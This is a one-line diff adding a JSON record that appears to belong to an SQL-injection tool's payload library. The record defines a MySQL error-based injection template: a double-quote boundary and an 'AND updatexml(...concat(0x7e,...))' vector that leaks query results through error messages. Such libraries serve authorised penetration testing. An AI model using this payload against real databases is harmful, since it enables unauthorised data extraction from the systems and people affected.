@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "error", "boundary": {"prefix": "\"", "suffix": "", "type": "double"}, "vector": "{B} AND updatexml(1,concat(0x7e,({Q})),1)", "comment": "mysql error: double"}
